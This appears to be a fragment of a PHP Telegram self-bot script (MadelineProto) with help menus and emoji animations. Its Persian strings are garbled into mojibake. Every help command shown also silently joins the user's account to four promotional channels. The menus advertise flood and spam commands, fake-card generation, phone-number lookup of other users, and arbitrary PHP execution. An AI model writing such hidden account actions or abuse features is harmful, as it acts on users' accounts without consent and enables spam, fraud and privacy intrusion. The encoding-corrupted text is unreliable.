$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *time help* ]

Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø§Ø³Ù1 - `timename1` on / off
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø§Ø³Ù2 - `timename2` on / off
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø¨ÛÙ1 - `timebio1` on / off
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø¨ÛÙ2 - `timebio2` on / off
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø¨ÛÙ Ø§ÛÙÚ¯ÙÛØ³Û - `bioen` on / off
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø§ÙØª ØªØ§ÛÙ ØªÙ Ø¨ÛÙ ÙØ§Ø±Ø³Û - `biofa` on / off
.
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'ans'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *ans help* ]

ØªÙØ¸ÛÙ Ù¾Ø§Ø³Ø® Ø®ÙØ¯Ú©Ø§Ø± â¨ï¸
 â¸ /setanswer  á´á´xá´|á´É´ê±á´¡á´Ê 
âââ â âââ
Ø­Ø°Ù Ø¬ÙØ§Ø¨ Ø®ÙØ¯Ú©Ø§Ø± âï¸
 â¸ /delanswer  á´á´xá´
âââ â âââ
ÙÙØ§ÛØ´ ÙÛØ³Øª Ø¬ÙØ§Ø¨ ÙØ§Û Ø®ÙØ¯Ú©Ø§Ø± ð¥
 â¸ /answerlist
âââ â âââ
Ø­Ø°Ù Ú©Ø§ÙÙ Ø¬ÙØ§Ø¨ ÙØ§Û Ø®ÙØ¯Ú©Ø§Ø± â
 â¸ /clean answers
âââ â âââ

",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'tan'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *tan help* ]


ØªÙØ¸ÛÙ ÙØªÙ Ø¯ÙØ®ÙØ§Ù Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª
Ø¨Ù Ø§ÛÙ ØµÙØ±Øª:ðð»
Ù¾Ø§Ø³Ø® Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª Ø³ÙØ§Ù Ø§ÙÙØ§ÛÙÙ

Ø±ÙØ´Ù Ù Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø±Ø¨Ø§Øª âï¸ 
 â¸ /bot  on / off 
âââ â âââ
Ø§Ø·ÙØ§Ø¹ Ø§Ø² Ø¢ÙÙØ§ÛÙ Ø¨ÙØ¯Ù Ø±Ø¨Ø§Øª ð±
 â¸ /bot / Ø±Ø¨Ø§Øª
âââ â âââ
Ø³Ø§Ø²ÙØ¯Ù Ø±Ø¨Ø§Øª âï¸
 â¸ /creator / Ø³Ø§Ø²ÙØ¯Ù
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ù¾Ø±ÙÚ©Ø³Û Ù¾Ø±Ø³Ø±Ø¹Øª ð¥
 â¸ /proxy / Ù¾Ø±ÙÚ©Ø³Û
âââ â âââ
Ø¯Ø±ÛØ§ÙØª ÙÛØ³Øª Ø±Ø§Ù ÙØ§ ð
 â¸ onlist / ÙÛØ³Øª Ø§ÙÙØ§ÛÙ
âââ â âââ
Ø±ÛØ³ØªØ§Ø±Øª Ú©Ø±Ø¯Ù Ø±Ø¨Ø§Øª ð§¶
 â¸ /restart / Ø±ÛØ³ØªØ§Ø±Øª
âââ â âââ
Ù¾ÛÙÚ¯ Ø³Ø±ÙØ± ð¯
 â¸ /ping / Ù¾ÛÙÚ¯
âââ â âââ
ÙÙØ¯Ø§Ø± Ø±Ù ÙØµØ±ÙÛ Ø§Ø² ÙØ§Ø³Øª ð
 â¸ /ram / Ø±Ù
âââ â âââ


",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'pra'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *pra help* ]

ÙØ§ÛÚ© Ø¯Ø§Ø± Ú©Ø±Ø¯Ù Ù¾ÛØ§Ù ðð»
 â¸  /like á´á´xá´ 
âââ â âââ
Ø³Ø§Ø®Øª Ú©Ø§Ø±Øª ÙÛÚ© ð´ââ ï¸
 â¸  /fakecard
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ú¯ÛÙ ÙØ±ØªØ¨Ø· Ø¨Ø§ ÙØªÙ ðª
 â¸  /gif  á´á´xá´ 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ú¯ÛÙ Ø§Ø² Ú©Ú©Ø³Ø§Ù Ú¯ÛÙ ð
 â¸  /koksal  á´á´xá´ 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø¹Ú©Ø³ ÙØ±ØªØ¨Ø· Ø¨Ø§ ÙØªÙ ð
 â¸  /pic â á´á´xá´ â 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø¬ÙÚ© ð
 â¸  /joke
â°âââ âÍâ ââââ¯
Ø³Ø±Ú ÙØªÙ Ø¯Ø± Ú¯ÙÚ¯Ù ð
 â¸  /google  á´á´xá´ 
â°âââ âÍâ ââââ¯
Ø³Ø±Ú ÙØªÙ Ø¯Ø± ÙÛÚ©Û Ù¾Ø¯ÛØ§ ð
 â¸  /wiki  á´á´xá´
â°âââ âÍâ ââââ¯
Ø³Ø±Ú ÙØªÙ Ø¯Ø± ÛÙØªØ¨ÙØ¨ ð¤
 â¸  /youtube  á´á´xá´
âââ â âââ
Ø¯Ø±ÛØ§ÙØª ÙÛØ³ Ø¨Ø§ ØªÙØ¬Ù ÙØªÙ Ø¯ÙØ®ÙØ§Ù ð
 â¸  /voice  á´á´xá´ 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø¢ÛØ¯Û Ø¹Ø¯Ø¯Û Ø¨Ø§ Ø±ÛÙ¾ÙØ§Û ð
 â¸  /id  á´á´xá´
âââ â âââ
Ø³ÛÙ Ú©Ø±Ø¯Ù ÚÛØ²Û Ø¯Ø± ÙØ¶Ø§Û Ø§Ø¨Ø±Û Ø´Ø®ØµÛ ð
 â¸  /save á´á´xá´ 
âââ â âââ
Ø§Ø¬Ø±Ø§Û Ú©Ø¯ ÙØ§Û Ù¾Û Ø§Ú Ù¾Û ð»
 â¸  /php  á´á´xá´
âââ â âââ
Ø¬Ø³Øª Ù Ø¬Ù Ú©Ø±Ø¯Ù ÙØªÙ Ø¯Ø± Ú¯Ø±ÙÙâ¨ï¸
 â¸  /search  á´á´xá´
âââ â âââ
Ù¾ÛØ¯Ø§ Ú©Ø±Ø¯Ù Ø§ÙÙÚ¯ Ø¨Ø§ ÙØªÙ ðµ
 â¸  /music  á´á´xá´ 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø¢Ø¨ Ù ÙÙØ§Û Ø´ÙØ±  ð¡
 â¸  /weather  á´Éªá´Ê 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø§Ø·ÙØ§Ø¹Ø§Øª Ú©Ø§Ø±Ø¨Ø±Û Ø¨Ø§ Ø¢ÛØ¯Û ð
 â¸  /info  á´ê±á´ÊÉ´á´á´á´ 
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ø§Ø·ÙØ§Ø¹Ø§Øª Ú¯Ø±ÙÙ âï¸
 â¸  /gpinfo
âââ â âââ
Ø¯Ø±ÛØ§ÙØª ÙØ´Ø³Øª ÙØ§Û ÙØ¹Ø§Ù â»ï¸
 â¸  /sessions
âââ â âââ
Ø¢Ù¾ÙÙØ¯ ÙØ§ÛÙ Ø§Ø² ÙÛÙÚ© ð¥
 â¸  /upload
âââ â âââ
Ù¾ÛØ¯Ø§ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù Ú©Ø§Ø±Ø¨Ø± Ø§Ø² Ø¯ÛØªØ§Ø¨ÛØ³ ð
 â¸  /number 
âââ â âââ
Ø¬Ø³Øª Ù Ø¬Ù Ø¨Ø±Ø§Û ÙÙØ¬ÙØ¯ Ø¨ÙØ¯Ù ÙØ§Ù Ú©Ø§Ø¨Ø±Ûð¤
 â¸  /checkusername @á´á´xá´ 
âââ â âââf
.
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'eny'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *eny help* ]

ØªÙØ¸ÛÙ Ø¯Ø´ÙÙ Ø¨Ø§ Ø¢ÛØ¯Û ÛØ§ Ø±ÛÙ¾ÙØ§Û âï¸
â¸ /setenemy
â¢ ââââââ â¢ ââââââ â¢
Ø­Ø°Ù Ø¯Ø´ÙÙ Ø¨Ø§ Ø¢ÛØ¯Û Ø¹Ø¯Ø¯Û ÛØ§ Ø±ÛÙ¾ÙØ§Û ð
â¸ /delenemy
â¢ ââââââ â¢ ââââââ â¢
Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª Ø¯Ø´ÙÙØ§Ù ð¤
â¸ /clean enemylist
â¢ ââââââ â¢ ââââââ â¢
Ø§Ø³Ù¾Ù Ù¾ÛØ§Ù Ø¯Ø± ÛÚ© ÙØªÙ ð
â¸ /flood â É´á´á´Êá´Ê â â á´á´xá´ â
â¢ ââââââ â¢ ââââââ â¢
Ø§Ø³Ù¾Ù Ù¾ÛØ§Ù Ø®Ø· Ø¨Ù Ø®Ø· ð
â¸ /spam â É´á´á´Êá´Ê â â á´á´xá´ â
â¢ ââââââ â¢ ââââââ â¢
Ø¨ÙØ§Ú© Ú©Ø±Ø¯Ù Ø§ÙØ±Ø§Ø¯ Ø¨Ø§ Ø¢ÛØ¯Û ÛØ§ Ø±ÛÙ¾ÙØ§Û ðª
â¸ /block
â¢ ââââââ â¢ ââââââ â¢
Ø¢ÙØ¨ÙØ§Ú© Ú©Ø±Ø¯Ù Ø§ÙØ±Ø§Ø¯ Ø¨Ø§ Ø¢ÛØ¯Û ÛØ§ Ø±ÛÙ¾ÙØ§Û ð¹
â¸ /unblock
â¢ ââââââ â¢ ââââââ â¢
Ø¨Ø´ÙØ§Ø±Ø´


.
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'gam'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
Ø¨Ú©ÛØ±Ù - Ø´Ø¨ Ø®ÙØ´ - ÙÙØªØ¨Ø§Ù
Ø¨ÙØ³ - ÙÚ©Ø± - Ø¯Ú©ØªØ±
Ø¬Ù - Ø®ÙØ¯Ù - ÙÙÛÚ©ÙÙ¾ØªØ±
Ø­Ù Ø¨ÙØ¯ - Ø­ÙÙÙ - ÙÛÙ
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text=='bk2' or $text=='2Ø¨Ú©ÛØ±Ù' or $text=='bekiram2'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ððð
ð         ð
ð           ð
ð        ð
ððð
ð         ð
ð           ð
ð           ð
ð        ð
ððð']);
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ð¶         ð¶
ð¶       ð¶
ð¶     ð¶
ð¶   ð¶
ð¶ð¶
ð¶   ð¶
ð¶      ð¶
ð¶        ð¶
ð¶          ð¶
ð¶            ð¶']);
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ððð          ð         ð
ð         ð      ð       ð
ð           ð    ð     ð
ð        ð       ð   ð
ððð          ðð
ð         ð      ð   ð
ð           ð    ð      ð
ð           ð    ð        ð
ð        ð       ð          ð
ððð          ð            ð']);


yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ððð          ð         ð
ð         ð      ð       ð
ð           ð    ð     ð
ð        ð       ð   ð
ððð          ðð
ð         ð      ð   ð
ð           ð    ð      ð
ð           ð    ð        ð
ð        ð       ð          ð
 ððð         ð            ð']);
 
 yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
â¤ï¸â¤ï¸â¤ï¸          â¤ï¸         â¤ï¸
â¤ï¸         â¤ï¸      â¤ï¸       â¤ï¸
â¤ï¸           â¤ï¸    â¤ï¸     â¤ï¸
â¤ï¸        â¤ï¸       â¤ï¸   â¤ï¸
â¤ï¸â¤ï¸â¤ï¸          â¤ï¸â¤ï¸
â¤ï¸         â¤ï¸      â¤ï¸   â¤ï¸
â¤ï¸           â¤ï¸    â¤ï¸      â¤ï¸
â¤ï¸           â¤ï¸    â¤ï¸        â¤ï¸
â¤ï¸        â¤ï¸       â¤ï¸          â¤ï¸
 â¤ï¸â¤ï¸â¤ï¸         â¤ï¸            â¤ï¸']);
 
 yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ð¥ð¥ð¥          ð¥         ð¥
ð¥         ð¥      ð¥       ð¥
ð¥           ð¥    ð¥     ð¥
ð¥        ð¥       ð¥   ð¥
ð¥ð¥ð¥          ð¥ð¥
ð¥         ð¥      ð¥   ð¥
ð¥           ð¥    ð¥      ð¥
ð¥           ð¥    ð¥        ð¥
ð¥        ð¥       ð¥          ð¥
 ð¥ð¥ð¥         ð¥            ð¥']);
 
 yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ððð          ð         ð
ð         ð      ð       ð
ð           ð    ð     ð
ð        ð       ð   ð
ððð          ðð
ð         ð      ð   ð
ð           ð    ð      ð
ð           ð    ð        ð
ð        ð       ð          ð
ððð          ð            ð']);

yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ð½ð½ð½          ð½         ð½
ð½         ð½      ð½       ð½
ð½           ð½    ð½     ð½
ð½        ð½       ð½   ð½
ð½ð½ð½          ð½ð½
ð½         ð½      ð½   ð½
ð½           ð½    ð½      ð½
ð½           ð½    ð½        ð½
ð½        ð½       ð½          ð½
ð½ð½ð½          ð½            ð½']);
 
}

if ($text == 'Ø´Ø¨ Ø®ÙØ´' or $text == 'Ø´Ø¨ Ø¨Ø®ÛØ± ' or $text=='Ø´Ù Ø®ÙØ´') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð              ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð             ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð            ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð           ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð          ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð         ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð        ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð       ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð      â¹ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð     ð£"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð    ð"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð   ð©"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð  ð¥±"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð ð¥±"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð´"]);
}
if ($text == 'Ú¯Ù Ø¨Ø²Ù' or $text=='ÙÙØªØ¨Ø§Ù' or $text=='ØªÙÛ Ø¯Ø±ÙØ§Ø²Ù') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð          â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð         â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð        â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð       â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð      â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð     â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð    â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð   â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð  â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ðâ½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð  â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð   â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð    â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð     â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð      â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð       â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð        â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð         â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð          â½ï¸"]);
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "(ð¥ ØªÙÛ Ø¯Ø±ÙØ§Ø²Ù Ù Ú¯ÙÙÙÙÙÙÙÙÙÙÙÙÙ ð¥³)"]);
}
if($text=='ððð' or $text=='Ø¨ÙØ³ Ø¨ÙØ³' or $text=='Ø¨ÙØ³Ø³'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»               ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»              ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»             ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»            ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»           ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»          ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»         ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»        ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»       ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»      ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»     ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»    ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»   ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»  ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð» ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð»ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
}
if($text=='Ú©ÛØ¨ÙØ±Ø¯' or $text=='ÙÚ©Ø± ÙØ±Ø¯'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'â¨ï¸']);
  yield $MadelineProto->sleep(4);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸ â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸  â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸   â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸    â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸     â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸      â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸       â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸        â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸         â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸          â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸           â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸            â¨ï¸']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»ââï¸']);
  yield $MadelineProto->sleep(2);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'Ø¹Ø¬Ø¨... ÙÚ©Ø±ÙÙÙ Ø¨Û Ú©ÛØ¨ÙØ±Ø¯ Ø´Ø¯ ð']);
}
if($text=='Ø¢ÙÙ¾ÙÙ' or $text=='ØªØ²Ø±ÛÙ' or $text=='Ø¯Ú©ØªØ±'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                          ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                        ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                      ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                    ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                  ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð                ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð              ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð            ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð          ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð        ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð      ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð    ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ð  ð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¨ð»ââï¸ðð']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(4);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
}
if($text=='Ø¬Ù' or $text=='Ø¨Ø¬Ù'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»<---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<ðð»---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<--ðð»-']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<---ðð»']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<--ðð»-']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<ðð»---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»<---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<--ðð»-']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»<---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<--ðð»-']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '<-ðð»--']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðð»<---']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¦ð¦ð¦<---']);
  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'Ø§ÛÙÙ Ø§Ø² Ø¬Ù Ø§ÙØ±ÙØ²Ø Ø¨Ø§Û Ø¨ÙÙÙØ§ð']);
}
if($text=='Ø®Ø®Ø®' or $text=='Ø®ÙØ¯Ù' or $text == 'lol'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
